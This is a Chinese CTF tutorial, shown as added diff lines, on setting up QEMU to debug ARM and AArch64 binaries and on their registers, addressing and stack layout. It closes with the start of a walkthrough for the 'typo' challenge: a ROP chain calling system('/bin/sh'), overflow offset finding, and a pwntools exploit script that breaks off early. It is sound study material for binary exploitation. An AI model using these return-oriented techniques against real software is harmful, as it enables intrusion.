+<h4 id="_4">处理依赖<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>这里依赖是根据本机环境来装，可能有些需要的依赖已经安装完成</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>sudo apt-get update
+<span class="c1"># re2c</span>
+sudo apt-get install re2c
+<span class="c1"># ninja </span>
+sudo apt-get install ninja-build
+<span class="c1"># other</span>
+sudo apt install pkg-config
+sudo apt install libglib2.0-dev
+sudo apt install libpixman-1-dev
+</code></pre></div>
+<h4 id="_5">编译安装<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>sudo ./configure
+sudo make -j4 <span class="c1"># 多线程编译自行调整</span>
+sudo make install 
+</code></pre></div>
+<p><code>./configure</code> 使用默认选项安装全部架构的环境，安装路径在 <code>/usr/local/bin</code></p>
+<div class="highlight"><pre><span></span><code>                                     Install prefix: /usr/local
+                   BIOS directory: share/qemu
+                    firmware path: /usr/local/share/qemu-firmware
+                 binary directory: bin
+                library directory: lib
+                 module directory: lib/qemu
+                libexec directory: libexec
+                include directory: include
+                 config directory: /usr/local/etc
+            <span class="nb">local</span> state directory: /usr/local/var
+                 Manual directory: share/man
+                    Doc directory: /usr/local/share/doc
+                  Build directory: /home/skye/qemu-5.2.0/build
+                      Source path: /home/skye/qemu-5.2.0
+</code></pre></div>
+<h3 id="_6">验证安装成功<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>~$ qemu-arm --version
+qemu-arm version <span class="m">5</span>.2.0
+Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003</span>-2020 Fabrice Bellard and the QEMU Project developers
+</code></pre></div>
+<p>到这里就能直接运行静态编译的多架构程序。可选清一下中间文件 <code>make clean</code></p>
+<h2 id="_7">安装动态运行库<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p>使用命令<code>apt-cache search "libc6" | grep "{架构名称}"</code>搜索并筛选可用的多架构运行库。</p>
+<p>我们只需要安装形如<code>libc6-*-cross</code>的运行库即可。</p>
+<h2 id="binutils">安装binutils环境<a class="headerlink" href="#binutils" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>原因：避免 pwntools 用 asm 时出错<a href="https://www.anquanke.com/post/id/199112#h3-10">LINK</a></p>
+</blockquote>
+<p>需要安装binutils依赖，首先使用命令<code>apt search binutils | grep [arch]</code>(此处的[arch]请自行替换)，随后安装显示出的包即可完成。</p>
+<h2 id="_8">参考文章<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p><a href="https://blog.csdn.net/wuu1010/article/details/104998804/">编译和安装QEMU-5.0.0</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/virtualization/qemu/qemu-install-and-debug/">qemu安装与调试</a></p>
+<p><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></p>
+<p><a href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></p>
+<h1 id="qemu_1">qemu 使用<a class="headerlink" href="#qemu_1" title="Permanent link">&para;</a></h1>
+<h2 id="_9">一般调试<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<p>以调试方式启动程序，程序启动后命中开头断点，等待 gdb 链接调试 </p>
+<div class="highlight"><pre><span></span><code>qemu-arm -g <span class="o">[</span>port<span class="o">]</span> -L <span class="o">[</span>dynamically linked file<span class="o">]</span> filename
+</code></pre></div>
+<p>新建终端 <code>gdb-multiarch filename -q</code> 启动 gdb </p>
+<p>进入GDB后，首先使用命令<code>set architecture [Arch-name]</code>设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)</p>
+<p>然后使用<code>target remote localhost:[port]</code>来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为<code>gef-remote localhost:[port]</code>)</p>
+<p>调试其他架构和运行库分别调整 qemu 和 -L 参数</p>
+<h2 id="_10">脚本模板<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>From:<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/"><img alt="🔗" class="emojione" src="https://cdnjs.cloudflare.com/ajax/libs/emojione/2.2.7/assets/png/1f517.png" title=":link:" /></a></p>
+<p>使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;your_binary&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;your_binary&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;your_binary&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;your_binary&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span><span class="p">)</span>
+</code></pre></div>
+<h1 id="arm">ARM架构<a class="headerlink" href="#arm" title="Permanent link">&para;</a></h1>
+<p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。</p>
+<h2 id="_11">寄存器规则<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
+<p><img alt="img" src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" /></p>
+<ol>
+<li>子程序间通过寄存器**R0～R3**来**传递参数**。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li>
+<li>在子程序中，使用寄存器**R4～R11**来**保存局部变量**。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则**子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值**。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li>
+<li>寄存器**R12**用作**过程调用中间临时寄存器**，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li>
+<li>寄存器**R13**用作**堆栈指针**，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li>
+<li>寄存器**R14**称为**连接寄存器**，记作LR。它用于**保存子程序的返回地址**。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li>
+<li>寄存器**R15**是**程序计数器**，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li>
+</ol>
+<h2 id="armintel">ARM寄存器与Intel寄存器对照关系<a class="headerlink" href="#armintel" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th align="center">ARM架构 寄存器名</th>
+<th align="center">寄存器描述</th>
+<th align="center">Intel架构 寄存器名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">R0</td>
+<td align="center">通用寄存器</td>
+<td align="center">EAX</td>
+</tr>
+<tr>
+<td align="center">R1~R5</td>
+<td align="center">通用寄存器</td>
+<td align="center">EBX、ECX、EDX、EDI、ESI</td>
+</tr>
+<tr>
+<td align="center">R6~R10</td>
+<td align="center">通用寄存器</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R11(FP)</td>
+<td align="center">栈帧指针</td>
+<td align="center">EBP</td>
+</tr>
+<tr>
+<td align="center">R12(IP)</td>
+<td align="center">内部程序调用</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R13(SP)</td>
+<td align="center">堆栈指针</td>
+<td align="center">ESP</td>
+</tr>
+<tr>
+<td align="center">R14(LR)</td>
+<td align="center">链接寄存器</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">R15(PC)</td>
+<td align="center">程序计数器</td>
+<td align="center">EIP</td>
+</tr>
+<tr>
+<td align="center">CPSR</td>
+<td align="center">程序状态寄存器</td>
+<td align="center">EFLAGS</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stack">堆栈(Stack)规则<a class="headerlink" href="#stack" title="Permanent link">&para;</a></h2>
+<p>ATPCS规定堆栈为FD类型，即Full Descending，意思是 <strong>SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长</strong>，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有**STMFD和LDMFD**。</p>
+<h3 id="stmfd">STMFD<a class="headerlink" href="#stmfd" title="Permanent link">&para;</a></h3>
+<p>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。<code>STMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p>
+<div class="highlight"><pre><span></span><code><span class="n">SP</span> <span class="o">=</span> <span class="n">SP</span> <span class="o">-</span> <span class="mi">9</span> <span class="n">x</span> <span class="mi">4</span> <span class="c1">//(共计压入R0-R7以及LR一共九个寄存器)</span>
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="n">SP</span>
+<span class="n">MEMORY</span><span class="p">[</span><span class="n">ADDRESS</span><span class="p">]</span> <span class="o">=</span> <span class="n">LR</span>
+<span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">7</span> <span class="n">to</span> <span class="mi">0</span>
+    <span class="n">MEMORY</span><span class="p">[</span><span class="n">ADDRESS</span><span class="p">]</span> <span class="o">=</span> <span class="n">Ri</span>
+    <span class="n">ADDRESS</span> <span class="o">=</span> <span class="n">ADDRESS</span> <span class="o">+</span> <span class="mi">4</span>
+</code></pre></div>
+<p>此处也可以看出，事实上的入栈顺序与<code>R0-R7，LR</code>相反。</p>
+<p>执行<code>SP = SP - 9 x 4</code>后<a href="https://img.lhyerror404.cn/error404/2020-02-03-032143.png"><img alt="image-20200203112143013" src="https://img.lhyerror404.cn/error404/2020-02-03-032143.png" /></a></p>
+<p>执行<code>ADDRESS = SP</code>后 <img alt="image-20200203112502852" src="https://img.lhyerror404.cn/error404/2020-02-03-032503.png" /></p>
+<p>执行<code>MEMORY[ADDRESS] = LR</code>后<img alt="image-20200203112741279" src="https://img.lhyerror404.cn/error404/2020-02-03-032741.png" /></p>
+<p>接下来，<code>ADDRESS</code>逐次上移，以此填入寄存器的值。<img alt="image-20200203112924692" src="https://img.lhyerror404.cn/error404/2020-02-03-032925.png" /></p>
+<p>至此，入栈指令执行结束。若入栈指令为<code>STMFD SP ,{R0-R7，LR}</code>，SP指针会在最后回到原位，不会改变SP指针的值。</p>
+<h3 id="ldmfd">LDMFD<a class="headerlink" href="#ldmfd" title="Permanent link">&para;</a></h3>
+<p>LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。<code>LDMFD SP! ,{R0-R7，LR}</code>实际上会执行以下命令：</p>
+<div class="highlight"><pre><span></span><code><span class="n">SP</span> <span class="o">=</span> <span class="n">SP</span> <span class="o">+</span> <span class="mi">9</span> <span class="n">x</span> <span class="mi">4</span>
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="n">SP</span>
+<span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">to</span> <span class="mi">7</span>
+    <span class="n">Ri</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="n">ADDRESS</span><span class="p">]</span>
+    <span class="n">ADDRESS</span> <span class="o">=</span> <span class="n">ADDRESS</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">LR</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="n">ADDRESS</span><span class="p">]</span>
+</code></pre></div>
+<h2 id="_12">传参规则<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
+<ol>
+<li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li>
+<li>在传递参数时，将所有参数看作是存放在连续的内存**字单元**的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。<strong>如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。</strong></li>
+</ol>
+<h2 id="_13">返回值规则<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<ol>
+<li>结果为一个32位整数时，可以通过寄存器R0返回</li>
+<li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li>
+<li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li>
+<li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li>
+<li>对于位数更多的结果，需要通过内存来传递。</li>
+</ol>
+<h2 id="_14">访址规则<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
+<h3 id="_15">寄存器直接取址<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<p>通常， LDR 指令被用来从内存中加载数据到寄存器， STR 指令被用作将寄存器的值存放到内存中。</p>
+<div class="highlight"><pre><span></span><code>@ LDR操作：从R0指向的地址中取值放到R2中
+LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>@ STR操作：将R2中的值放到R1指向的地址中
+STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址
+</code></pre></div>
+<p>示例代码</p>
+<div class="highlight"><pre><span></span><code>.data          /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/
+var1: .word 3  /* 内存中的第一个变量且赋值为3 */
+var2: .word 4  /* 内存中的第二个变量且赋值为4 */
+
+.text          /* 代码段开始 */ 
+.global _start
+
+_start:
+    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
+    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
+    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
+    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3
+    bkpt        
+
+adr_var1: .word var1  /* var1的地址助记符 */
+adr_var2: .word var2  /* var2的地址助记符 */
+</code></pre></div>
+<h3 id="_16">立即数偏移寻址<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<p>接下来我们对这段代码进行反编译，结果如下：</p>
+<div class="highlight"><pre><span></span><code>ldr  r0, [ pc, #12 ]   ; 0x8088 &lt;adr_var1&gt;
+ldr  r1, [ pc, #12 ]   ; 0x808c &lt;adr_var2&gt;
+ldr  r2, [r0]
+str  r2, [r1]
+bx   lr
+</code></pre></div>
+<p>此处，<code>[PC,#12]</code>的意义是<code>PC + 4*3</code>，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码：</p>
+<div class="highlight"><pre><span></span><code>_start:
+    ldr  r0, [ pc, #12 ]   ; &lt;- PC
+    ldr  r1, [ pc, #12 ]   
+    ldr  r2, [r0]
+    str  r2, [r1]
+    bx   lr       
+
+adr_var1: .word var1  
+adr_var2: .word var2
+</code></pre></div>
+<p>我们若想获取var_1，应该为<code>PC + 4 * 5</code>才对，但是我们之前提过的，<strong>在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置</strong>，也就是说，此时程序中的状况应该如下表所示：</p>
+<div class="highlight"><pre><span></span><code>_start:
+    ldr  r0, [ pc, #12 ]
+    ldr  r1, [ pc, #12 ]   
+    ldr  r2, [r0]          ; &lt;- PC
+    str  r2, [r1]
+    bx   lr       
+
+adr_var1: .word var1  
+adr_var2: .word var2
+</code></pre></div>
+<p>这种形如<code>[Ri , num]</code>的方式被称为**立即数作偏移寻址**。</p>
+<div class="highlight"><pre><span></span><code>str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
+str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
+ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
+</code></pre></div>
+<h3 id="_17">寄存器作偏移寻址<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 
+str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。
+ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。
+</code></pre></div>
+<h3 id="_18">寄存器缩放值作偏移寻址<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
+str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。
+ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。
+</code></pre></div>
+<h2 id="armeabi">ARMEABI<a class="headerlink" href="#armeabi" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>未验证，感觉有点冲突</p>
+</blockquote>
+<p>前面介绍了arm 64位架构，armeabi 是 32 架构，指令也类似，只不过它的栈布局与常规 x86 的一样，<strong>R11和PC的值保存在栈底</strong>。<strong>R11充当ebp，PC充当RIP</strong> 。 LDMFD  SP!, {R11,PC} 指令即相当于 pop ebp;ret 的作用</p>
+<p>例题：<a href="# inctf2018_wARMup">inctf2018_wARMup</a></p>
+<h1 id="arch64">Arch64架构<a class="headerlink" href="#arch64" title="Permanent link">&para;</a></h1>
+<p>在ARMv8引入的一种全新架构。</p>
+<h2 id="_19">寄存器<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
+<p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫 Xn ，运行在32位的时候就叫 Wn 。</p>
+<table>
+<thead>
+<tr>
+<th align="center">寄存器</th>
+<th align="center">别名</th>
+<th align="center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">SP</td>
+<td align="center">–</td>
+<td align="center">Stack Pointer:栈指针</td>
+</tr>
+<tr>
+<td align="center">R30</td>
+<td align="center">LR</td>
+<td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td>
+</tr>
+<tr>
+<td align="center">R29</td>
+<td align="center">FP</td>
+<td align="center">Frame Pointer:保存函数栈的基地址。</td>
+</tr>
+<tr>
+<td align="center">R19-R28</td>
+<td align="center">–</td>
+<td align="center">Callee-saved registers（含义见上面术语解释）</td>
+</tr>
+<tr>
+<td align="center">R18</td>
+<td align="center">–</td>
+<td align="center">平台寄存器，有特定平台解释其用法。</td>
+</tr>
+<tr>
+<td align="center">R17</td>
+<td align="center">IP1</td>
+<td align="center">The second intra-procedure-call temporary register……</td>
+</tr>
+<tr>
+<td align="center">R16</td>
+<td align="center">IP0</td>
+<td align="center">The first intra-procedure-call temporary register……</td>
+</tr>
+<tr>
+<td align="center">R9-R15</td>
+<td align="center">–</td>
+<td align="center">临时寄存器</td>
+</tr>
+<tr>
+<td align="center">R8</td>
+<td align="center">–</td>
+<td align="center">在一些情况下，返回值是通过R8返回的</td>
+</tr>
+<tr>
+<td align="center">R0-R7</td>
+<td align="center">–</td>
+<td align="center">在函数调用过程中传递参数和返回值</td>
+</tr>
+<tr>
+<td align="center">NZCV</td>
+<td align="center">–</td>
+<td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td>
+</tr>
+</tbody>
+</table>
+<h2 id="_20">指令基本格式<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>&lt;Opcode&gt;{&lt;Cond&gt;}&lt;S&gt; &lt;Rd&gt;, &lt;Rn&gt; {,&lt;Opcode2&gt;}
+</code></pre></div>
+<p>Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。</p>
+<p>Cond：指令执行条件码。</p>
+<p>S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。</p>
+<p>Rd/Xt：目标寄存器，A32指令可以选择R0-R14，T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。</p>
+<p>Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。</p>
+<p>Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。</p>
+<h2 id="-loadstore">内存操作指令-load/store<a class="headerlink" href="#-loadstore" title="Permanent link">&para;</a></h2>
+<p>在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。</p>
+<p>在ARM-v8指令集中，程序支持以下五种寻址方式：</p>
+<ol>
+<li>Base register only (no offset) ：基址寄存器无偏移。形如:<code>[ base { , #0 } ]</code>。</li>
+<li>Base plus offset：基址寄存器加偏移。形如:<code>[ base { , #imm } ]</code>。</li>
+<li>Pre-indexed：事先更新寻址，先变化后操作。形如:<code>[ base , #imm ]!</code>。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</li>
+<li>Post-indexed：事后更新寻址，先操作后变化。形如:<code>[ base ] , #imm</code>。</li>
+<li>Literal (PC-relative): PC相对寻址。</li>
+</ol>
+<p>常见的Load/Store指令有：</p>
+<p>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</p>
+<p>⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。</p>
+<p>举例：</p>
+<p><code>LDR X1 , [X2]</code>——将X2寄存器中的值赋给X1寄存器。</p>
+<p><code>LDR X1 , [X2] ， #4</code>——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。</p>
+<p>对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。</p>
+<h2 id="amd">与 amd 的变化<a class="headerlink" href="#amd" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>引用：<a href="https://blog.csdn.net/seaaseesa/article/details/105281585"><img alt="🔗" class="emojione" src="https://cdnjs.cloudflare.com/ajax/libs/emojione/2.2.7/assets/png/1f517.png" title=":link:" /></a></p>
+</blockquote>
+<p>栈布局上和 amd 有比较大区别，这样一个程序：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">fun</span><span class="p">(){</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">fun</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>从 main 进入 fun 时，栈分布如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">内存地址</th>
+<th align="left">内存中的数据</th>
+<th align="left">备注</th>
+<th align="center">所有者</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">低</td>
+<td align="left">X29 value</td>
+<td align="left">main 调用 fun 时的寄存器值</td>
+<td align="center">fun</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="left">X30 value</td>
+<td align="left">同上</td>
+<td align="center">fun</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="left">buf</td>
+<td align="left">fun 的局部变量</td>
+<td align="center">fun</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="left">X29 value</td>
+<td align="left">上层函数调用main时的寄存器值</td>
+<td align="center">main</td>
+</tr>
+<tr>
+<td align="center">高</td>
+<td align="left">X30 value</td>
+<td align="left">同上</td>
+<td align="center">main</td>
+</tr>
+</tbody>
+</table>
+<p><strong>x86 架构下的 rbp、rip 保存在栈低，aarch64 架构下保存在栈顶。</strong></p>
+<p><strong>如果存在栈溢出，修改的上层函数的 rbp 和 rip（x29、x30）。</strong></p>
+<h1 id="_21">入门实战<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h1>
+<h2 id="jarvisoj-typo">jarvisoj - typo<a class="headerlink" href="#jarvisoj-typo" title="Permanent link">&para;</a></h2>
+<h3 id="_22">基本情况<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<p>只打开 nx 保护，静态链接程序，没有符号表。<code>qemu-arm ./typo</code> 启动看看，是个打字程序，打字界面存在溢出。</p>
+<p>ida 加载后搜索字符串，发现有 /bin/sh 和 system 。用 rizzo 提取 libc 符号表后导入到程序还原出 system 地址。</p>
+<p>找 gadget 第一个参数在 r0 ，下一条命令在 pc ，找到 gadget <code>pop_r0_r4_pc</code> 。栈布局如下：</p>
+<div class="highlight"><pre><span></span><code>+-------------+
+|             |
+|  padding    |
++-------------+
+|  padding    | &lt;- frame pointer
++-------------+ 
+|gadgets_addr | &lt;- return address
++-------------+
+|binsh_addr   |
++-------------+
+|junk_data    |
++-------------+
+|system_addr  |
++-------------+
+</code></pre></div>
+<p>本地调试用 gdb 的 cycli 功能得出溢出长度：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; cyclic 200
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+pwndbg&gt; c
+Continuing.
+
+……
+───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
+Invalid address 0x62616164
+……
+
+pwndbg&gt; cyclic -l 0x62616164
+112
+</code></pre></div>
+<p>字符串输入不能和 amd 架构可以边调试边输入，要用脚本输入。最后得出 padding 112 。</p>
+<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./typo&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
